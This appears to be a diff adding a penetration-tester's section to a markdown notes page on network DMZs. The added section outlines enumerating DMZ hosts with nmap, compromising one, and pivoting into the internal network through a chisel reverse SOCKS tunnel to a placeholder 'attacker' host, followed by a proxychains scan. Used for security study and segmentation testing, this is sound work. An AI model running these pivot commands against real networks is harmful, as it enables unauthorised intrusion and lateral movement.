@@ -14,3 +14,49 @@ Now, let's translate that analogy into network security terms:
 By creating a DMZ, an organization can control and monitor traffic between the internal network and the external network. This ensures that only necessary and safe communication occurs between the internal and external environments. The DMZ acts as a protective barrier, preventing direct access to the sensitive internal network from the outside.
 
 In the context of computer networks, common components found in a DMZ include firewalls, intrusion detection/prevention systems, and proxy servers. These components work together to filter and monitor traffic, allowing the organization to balance the need for accessibility with the imperative of security.
+
+---
+
+## The DMZ from a pentester's view
+
+The DMZ is usually your **first foothold** — it holds the internet-facing servers you can reach directly. The goal is to compromise a DMZ host and then **pivot** through it into the protected internal network.
+
+### Typical attack path
+
+```
+Internet --> [DMZ web/mail server]  <-- your initial target
+                    |
+              (pivot through it)
+                    v
+            [Internal network]  <-- the real prize
+```
+
+1. **Enumerate DMZ services** — web, mail, VPN, DNS are common here.
+
+```bash
+nmap -sV -p- dmz-host
+```
+
+2. **Exploit a DMZ host** (webshell, RCE, weak creds).
+3. **Pivot inward** — the DMZ box often has a second interface into the internal LAN:
+
+```bash
+# Discover a second NIC / internal subnet from the compromised host
+ip a; ip route
+# Tunnel/pivot into the internal network
+chisel client attacker:8000 R:socks     # reverse SOCKS proxy
+proxychains nmap -sT 10.0.0.0/24         # scan internal net through the pivot
+```
+
+### Common findings
+
+- **Over-permissive firewall rules** — DMZ host can reach far more of the internal network than it should.
+- **Dual-homed hosts** — a DMZ server with a direct route to sensitive internal systems defeats the whole point.
+- **Shared credentials** — a local admin password reused between DMZ and internal hosts.
+
+A well-segmented DMZ means compromising it gives you *little* internal reach; test whether that segmentation actually holds.
+
+## Related
+
+- [Firewall](../Networking/Firewall.md) · [Jump Server](Jump%20Server.md)
+- [Network Segmentation](../Networking/Subnetting.md)
